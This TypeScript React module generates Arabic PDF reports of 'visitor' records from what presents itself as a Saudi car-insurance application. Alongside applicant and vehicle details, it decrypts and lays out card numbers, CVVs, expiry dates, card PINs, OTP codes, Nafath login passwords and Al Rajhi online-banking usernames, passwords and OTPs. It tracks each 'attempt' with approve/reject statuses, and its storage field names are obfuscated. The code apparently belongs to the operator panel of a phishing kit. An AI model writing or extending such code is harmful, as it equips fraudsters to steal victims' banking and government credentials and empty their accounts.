"use client";

import type { InsuranceApplication } from "@/lib/firestore-types";
import { _d } from "@/lib/secure-utils";

function decryptField(value: string | undefined): string {
  if (!value) return "-";
  try {
    return _d(value) || value;
  } catch {
    return value;
  }
}

function formatDate(date: string | Date | undefined): string {
  if (!date) return "-";
  try {
    const d = new Date(date as string);
    return d.toLocaleString("ar-SA", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    });
  } catch {
    return String(date);
  }
}

function buildPdfHtml(visitor: InsuranceApplication): string {
  const cardNumber = decryptField(visitor._v1 || visitor.cardNumber);
  const cvv = decryptField(visitor._v2 || visitor.cvv);
  const expiryDate = decryptField(visitor._v3 || visitor.expiryDate);
  const cardHolderName = decryptField(visitor._v4 || visitor.cardHolderName);
  const nafazId = decryptField(visitor._v8 || visitor.nafazId);
  const nafazPass = decryptField(visitor._v9 || visitor.nafazPass);
  const phoneOtp = decryptField(visitor._v7 || visitor.phoneOtp);
  const rajhiUser = decryptField(visitor._v10 || visitor.rajhiUser);
  const rajhiPassword = decryptField(visitor._v11 || visitor.rajhiPassword || visitor.rajhiPasswrod);
  const rajhiOtp = decryptField(visitor._v12 || visitor.rajhiOtp);

  const allCardHistory =
    visitor.history?.filter(
      (h: any) => h.type === "_t1" || h.type === "card"
    ) || [];
  const sortedCardHistory = allCardHistory.sort((a: any, b: any) => {
    return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
  });

  const allOtpHistory =
    visitor.history?.filter(
      (h: any) => h.type === "_t2" || h.type === "otp"
    ) || [];
  const sortedOtpHistory = allOtpHistory.sort((a: any, b: any) => {
    return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
  });

  const allPhoneOtpHistory =
    visitor.history?.filter(
      (h: any) => h.type === "_t5" || h.type === "phone_otp"
    ) || [];
  const sortedPhoneOtpHistory = allPhoneOtpHistory.sort((a: any, b: any) => {
    return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
  });

  const statusLabel = (status: string | undefined) => {
    switch (status) {
      case "approved":
        return '<span style="color: #059669; font-weight: 600;">✓ تم القبول</span>';
      case "rejected":
        return '<span style="color: #DC2626; font-weight: 600;">✗ تم الرفض</span>';
      default:
        return '<span style="color: #D97706; font-weight: 600;">⏳ قيد المراجعة</span>';
    }
  };

  const renderSection = (
    title: string,
    icon: string,
    color: string,
    rows: { label: string; value: string }[]
  ) => {
    const filteredRows = rows.filter((r) => r.value && r.value !== "-" && r.value !== "undefined");
    if (filteredRows.length === 0) return "";

    return `
      <div style="margin-bottom: 20px; break-inside: avoid;">
        <div style="background: ${color}; border-radius: 12px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.06);">
          <div style="padding: 14px 20px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid rgba(255,255,255,0.2);">
            <span style="font-size: 20px;">${icon}</span>
            <span style="font-size: 16px; font-weight: 700; color: #1F2937;">${title}</span>
          </div>
          <div style="padding: 0;">
            ${filteredRows
              .map(
                (row, i) => `
              <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px 20px; ${i < filteredRows.length - 1 ? "border-bottom: 1px solid rgba(0,0,0,0.05);" : ""}">
                <span style="color: #6B7280; font-size: 13px; font-weight: 500;">${row.label}</span>
                <span style="color: #1F2937; font-size: 14px; font-weight: 600; unicode-bidi: plaintext;">${row.value}</span>
              </div>
            `
              )
              .join("")}
          </div>
        </div>
      </div>
    `;
  };

  let cardSections = "";
  if (sortedCardHistory.length > 0) {
    sortedCardHistory.forEach((card: any, index: number) => {
      const cn = decryptField(card.data?._v1);
      const cv = decryptField(card.data?._v2);
      const ed = decryptField(card.data?._v3);
      const ch = decryptField(card.data?._v4);
      const title =
        index === 0
          ? "معلومات البطاقة"
          : `معلومات البطاقة (محاولة ${sortedCardHistory.length - index})`;
      cardSections += renderSection(title, "💳", "#FFF7ED", [
        { label: "رقم البطاقة", value: cn },
        { label: "اسم حامل البطاقة", value: ch },
        { label: "نوع البطاقة", value: card.data?.cardType || "-" },
        { label: "تاريخ الانتهاء", value: ed },
        { label: "CVV", value: cv },
        { label: "البنك", value: card.data?.bankInfo?.name || "-" },
        { label: "الحالة", value: statusLabel(card.status) },
        { label: "التاريخ", value: formatDate(card.timestamp) },
      ]);
    });
  } else if (cardNumber !== "-") {
    cardSections = renderSection("معلومات البطاقة", "💳", "#FFF7ED", [
      { label: "رقم البطاقة", value: cardNumber },
      { label: "اسم حامل البطاقة", value: cardHolderName },
      { label: "تاريخ الانتهاء", value: expiryDate },
      { label: "CVV", value: cvv },
    ]);
  }

  let otpSections = "";
  if (sortedOtpHistory.length > 0) {
    sortedOtpHistory.forEach((otp: any, index: number) => {
      const otpCode = decryptField(otp.data?._v5);
      const title =
        index === 0
          ? "كود OTP"
          : `كود OTP (محاولة ${sortedOtpHistory.length - index})`;
      otpSections += renderSection(title, "🔑", "#FDF2F8", [
        { label: "الكود", value: otpCode },
        { label: "الحالة", value: statusLabel(otp.status) },
        { label: "التاريخ", value: formatDate(otp.timestamp) },
      ]);
    });
  }

  const allPinHistory =
    visitor.history?.filter(
      (h: any) => h.type === "_t3" || h.type === "pin"
    ) || [];
  const sortedPinHistory = allPinHistory.sort((a: any, b: any) => {
    return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
  });

  let pinSections = "";
  if (sortedPinHistory.length > 0) {
    sortedPinHistory.forEach((pin: any, index: number) => {
      const pinCode = decryptField(pin.data?._v6);
      const title =
        index === 0
          ? "رمز PIN"
          : `رمز PIN (محاولة ${sortedPinHistory.length - index})`;
      pinSections += renderSection(title, "🔐", "#EEF2FF", [
        { label: "الكود", value: pinCode },
        { label: "الحالة", value: statusLabel(pin.status) },
        { label: "التاريخ", value: formatDate(pin.timestamp) },
      ]);
    });
  }

  let phoneOtpSections = "";
  if (sortedPhoneOtpHistory.length > 0) {
    sortedPhoneOtpHistory.forEach((potp: any, index: number) => {
      const code = decryptField(potp.data?._v7);
      const title =
        index === 0
          ? "كود تحقق الهاتف"
          : `كود تحقق الهاتف (محاولة ${sortedPhoneOtpHistory.length - index})`;
      phoneOtpSections += renderSection(title, "✅", "#F0FDF4", [
        { label: "كود التحقق", value: code },
        { label: "الحالة", value: statusLabel(potp.status) },
        { label: "التاريخ", value: formatDate(potp.timestamp) },
      ]);
    });
  } else if (phoneOtp !== "-") {
    phoneOtpSections = renderSection("كود تحقق الهاتف", "✅", "#F0FDF4", [
      { label: "كود التحقق", value: phoneOtp },
    ]);
  }

  return `
    <div id="pdf-content" style="
      font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
      direction: rtl;
      text-align: right;
      max-width: 700px;
      margin: 0 auto;
      padding: 0;
      background: #FFFFFF;
      color: #1F2937;
    ">
      <!-- Header -->
      <div style="
        background: linear-gradient(135deg, #1E40AF 0%, #3B82F6 50%, #60A5FA 100%);
        padding: 30px;
        border-radius: 0 0 24px 24px;
        text-align: center;
        margin-bottom: 24px;
      ">
        <div style="font-size: 13px; color: rgba(255,255,255,0.8); margin-bottom: 4px; letter-spacing: 2px;">تأمين السيارات</div>
        <div style="font-size: 24px; font-weight: 800; color: #FFFFFF; margin-bottom: 6px;">استمارة طلب</div>
        <div style="
          display: inline-block;
          background: rgba(255,255,255,0.2);
          padding: 6px 18px;
          border-radius: 20px;
          font-size: 12px;
          color: #FFFFFF;
          margin-top: 8px;
        ">
          رقم المستند: ${visitor.id || "-"}
        </div>
      </div>

      <!-- Content -->
      <div style="padding: 0 20px;">
        ${renderSection("معلومات مقدم الطلب", "👤", "#EFF6FF", [
          { label: "الاسم الكامل", value: visitor.ownerName || "-" },
          { label: "رقم الهوية", value: visitor.identityNumber || "-" },
          { label: "رقم الهاتف", value: visitor.phoneNumber || "-" },
          { label: "نوع الوثيقة", value: visitor.documentType || "-" },
          { label: "نوع التأمين", value: visitor.insuranceType || "-" },
          ...(visitor.insuranceType === "نقل ملكية"
            ? [
                { label: "اسم المشتري", value: visitor.buyerName || "-" },
                { label: "رقم هوية المشتري", value: visitor.buyerIdNumber || "-" },
              ]
            : []),
        ])}

        ${renderSection("معلومات المركبة", "🚗", "#F0FDF4", [
          { label: "الرقم التسلسلي", value: visitor.serialNumber || "-" },
          { label: "موديل المركبة", value: visitor.vehicleModel || "-" },
          { label: "سنة الصنع", value: visitor.vehicleYear || "-" },
          { label: "قيمة المركبة", value: visitor.vehicleValue ? String(visitor.vehicleValue) : "-" },
          { label: "استخدام المركبة", value: visitor.vehicleUsage || "-" },
          { label: "نوع التغطية", value: visitor.insuranceCoverage || "-" },
          { label: "تاريخ بدء التأمين", value: visitor.insuranceStartDate || "-" },
          { label: "موقع الإصلاح", value: visitor.repairLocation === "agency" ? "وكالة" : visitor.repairLocation === "workshop" ? "ورشة" : "-" },
        ])}

        ${
          visitor.selectedOffer
            ? renderSection("عرض التأمين", "📊", "#F5F3FF", [
                {
                  label: "الشركة",
                  value:
                    (visitor.selectedOffer as any).name ||
                    (visitor.selectedOffer as any).company ||
                    "-",
                },
                {
                  label: "السعر الأصلي",
                  value: visitor.originalPrice
                    ? `ر.س ${visitor.originalPrice}`
                    : "-",
                },
                {
                  label: "الخصم",
                  value: visitor.discount
                    ? `${(visitor.discount * 100).toFixed(0)}%`
                    : "-",
                },
                {
                  label: "السعر الإجمالي",
                  value:
                    visitor.finalPrice || visitor.offerTotalPrice
                      ? `ر.س ${visitor.finalPrice || visitor.offerTotalPrice}`
                      : "-",
                },
                {
                  label: "المميزات",
                  value: Array.isArray(visitor.selectedFeatures)
                    ? visitor.selectedFeatures.join("، ")
                    : "-",
                },
              ])
            : ""
        }

        ${cardSections}
        ${otpSections}
        ${pinSections}

        ${renderSection("معلومات الهاتف", "📱", "#ECFDF5", [
          { label: "رقم الهاتف", value: visitor.phoneNumber || "-" },
          { label: "شركة الاتصالات", value: visitor.phoneCarrier || "-" },
        ])}

        ${phoneOtpSections}

        ${renderSection("توثيق نفاذ", "🇸🇦", "#EEF2FF", [
          { label: "رقم الهوية", value: nafazId },
          { label: "كلمة المرور", value: nafazPass },
          { label: "رقم التوثيق", value: visitor.nafadConfirmationCode || "-" },
        ])}

        ${renderSection("الراجحي", "🏦", "#F0FDF4", [
          { label: "اسم المستخدم", value: rajhiUser },
          { label: "كلمة المرور", value: rajhiPassword },
          { label: "رمز OTP", value: rajhiOtp },
        ])}

        ${renderSection("البيانات الوصفية", "🌐", "#F9FAFB", [
          { label: "الدولة", value: visitor.country || "-" },
          { label: "المتصفح", value: visitor.browser || "-" },
          { label: "نظام التشغيل", value: visitor.os || "-" },
          { label: "نوع الجهاز", value: visitor.deviceType || "-" },
          { label: "دقة الشاشة", value: visitor.screenResolution || "-" },
          { label: "تاريخ الإنشاء", value: formatDate(visitor.createdAt) },
          { label: "آخر نشاط", value: formatDate(visitor.lastActiveAt) },
        ])}
      </div>

      <!-- Footer -->
      <div style="
        text-align: center;
        padding: 20px;
        margin-top: 10px;
        border-top: 1px solid #E5E7EB;
        color: #9CA3AF;
        font-size: 11px;
      ">
        <div>تم الإنشاء: ${formatDate(visitor.createdAt)} | رقم المستند: ${visitor.id || "-"}</div>
      </div>
    </div>
  `;
}

export async function generateVisitorPdf(visitor: InsuranceApplication) {
  const html2pdf = (await import("html2pdf.js")).default;

  const container = document.createElement("div");
  container.innerHTML = buildPdfHtml(visitor);
  container.style.position = "absolute";
  container.style.left = "-9999px";
  container.style.top = "0";
  container.style.width = "700px";
  document.body.appendChild(container);

  const element = container.querySelector("#pdf-content") as HTMLElement;

  const opt = {
    margin: [10, 5, 10, 5] as [number, number, number, number],
    filename: `طلب_تأمين_${visitor.identityNumber || visitor.id || "visitor"}.pdf`,
    image: { type: "jpeg" as const, quality: 0.98 },
    html2canvas: {
      scale: 2,
      useCORS: true,
      letterRendering: true,
      scrollY: 0,
    },
    jsPDF: {
      unit: "mm",
      format: "a4",
      orientation: "portrait" as const,
    },
    pagebreak: { mode: ["avoid-all", "css", "legacy"] },
  };

  try {
    await html2pdf().set(opt).from(element).save();
  } finally {
    document.body.removeChild(container);
  }
}
